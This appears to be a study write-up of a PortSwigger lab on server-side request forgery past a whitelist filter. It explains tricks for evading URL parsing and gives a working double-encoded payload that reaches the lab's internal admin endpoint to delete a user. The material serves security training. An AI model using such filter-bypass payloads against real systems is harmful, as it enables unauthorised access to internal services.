# SSRF with whitelist-based input filter

[Lab in PortSwigger](https://portswigger.net/web-security/ssrf/lab-ssrf-with-whitelist-filter)

## Definition
 Some applications only allow input that matches, begins with, or contains, a whitelist of permitted values. In this situation, you can sometimes circumvent the filter by exploiting inconsistencies in URL parsing.

The URL specification contains a number of features that are liable to be overlooked when implementing ad hoc parsing and validation of URLs:

- You can embed credentials in a URL before the hostname, using the @ character. For example: `https://expected-host@evil-host`.
- You can use the # character to indicate a URL fragment. For example: `https://evil-host#expected-host`.
- You can leverage the DNS naming hierarchy to place required input into a fully-qualified DNS name that you control. For example: `https://expected-host.evil-host`.
- You can URL-encode characters to confuse the URL-parsing code. This is particularly useful if the code that implements the filter handles URL-encoded characters differently than the code that performs the back-end HTTP request.
- You can use combinations of these techniques together.

## Notes
Original stock API URL
`http%3A%2F%2Fstock.weliketoshop.net%3A8080%2Fproduct%2Fstock%2Fcheck%3FproductId%3D2%26storeId%3D1`

Change the stock API URL like below and check the result
`stockApi=http%3A%2F%2F127.1%2523@stock.weliketoshop.net/admin`

The final payload
`stockApi=http%3A%2F%2F127.1%2523@stock.weliketoshop.net/admin/delete?username=carlos`


## Key Words
> whitelist, circumvent, ssrf